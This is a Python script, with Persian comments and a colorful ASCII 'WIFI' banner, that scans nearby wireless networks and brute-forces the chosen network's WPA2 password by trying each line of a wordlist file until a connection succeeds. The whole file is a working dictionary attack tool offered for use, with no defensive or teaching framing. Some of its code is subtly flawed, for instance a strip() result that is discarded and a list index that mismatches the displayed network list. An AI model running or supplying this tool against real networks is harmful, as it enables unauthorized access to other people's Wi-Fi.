# No mask
from random import choice
from time import *
from pywifi import PyWiFi, const, Profile
from colorama import Fore as color
from datetime import datetime
import os

yellow,green,red,blue,cyan,maga=color.YELLOW,color.GREEN,color.RED,color.BLUE,color.CYAN,color.MAGENTA

os.system('cls'or'clear')

colors=[yellow,red,green,cyan,blue,maga]

rand1=choice(colors)
rand2=choice(colors)
rand3=choice(colors)
rand4=choice(colors)
rand5=choice(colors)
rand6=choice(colors)

banner=f"""{rand1}██╗    ██╗██╗███████╗██╗
{rand2}██║    ██║██║██╔════╝██║
{rand3}██║ █╗ ██║██║█████╗  ██║
{rand4}██║███╗██║██║██╔══╝  ██║
{rand5}╚███╔███╔╝██║██║     ██║
 {rand6}╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
                        """

for i in banner.splitlines():
    sleep(0.6)
    print(i)




def creck_wifi():
    wifi=PyWiFi()

    #اتصال یا ارتباط برقرار کردن با کارت شبکه 
    iface=wifi.interfaces()[0]


    #اسکن
    iface.scan()
    sleep(3)

    #نتیجه اسکن
    results = iface.scan_results()
    if len(results)>=1:  


        networks={i.ssid for i in results}


        networks=list(networks)
        print(color.LIGHTRED_EX+'-'*25)
        
        for network in enumerate(networks):
            print(f"{yellow}[{network[0]}] {blue}wifi: {network[1]}\n")
            
        print(color.LIGHTRED_EX+'-'*25)



        try:
            #انتخاب شبکه از لیست
            client=int(input(color.LIGHTGREEN_EX+'[+] Enter network number>>> '))

            #گرفتن نام از لیست  از طریق ایندکس
            selected_network=results[client].ssid

            #ایجاد پروفایل برای ادامه کار
            profile=Profile()

            #نام وایفا
            profile.ssid=selected_network

            #تایید هویت 
            profile.auth=const.AUTH_ALG_OPEN

            #کلید یا امنیت شبکه
            profile.akm.append(const.AKM_TYPE_WPA2PSK)

            #نوع رمز نگار ی
            profile.cipher=const.CIPHER_TYPE_CCMP

        
            name_file=input(color.LIGHTBLACK_EX+"[*] Name file password :")
        
            file=open(file=name_file,mode='r').readlines()
            
            for line in file:
    
                line.strip()
                profile.key =line

                #وصل شدن به وایفا با کارت شبکه
                iface.connect(iface.add_network_profile(profile)) 


                # تأیید اتصال
                sleep(1.6)
                if iface.status() == const.IFACE_CONNECTED:
                    print(f"{yellow}[*]Time:{cyan}{datetime.now().strftime('%H:%M:%S')} {green}connect password >>{blue} {line} | wifi >>{blue} {selected_network}")
                    exit()
                else:
                    print(f"{yellow}[*]Time:{cyan}{datetime.now().strftime('%H:%M:%S')} {red}Not connect password >>{line}")
                    
        except KeyboardInterrupt:
            pass
        
        
        except FileNotFoundError:
            exit(f'{cyan}File not found try again')
      
        
    else: 
        print(f'{cyan}Not finding network'.strip())

creck_wifi()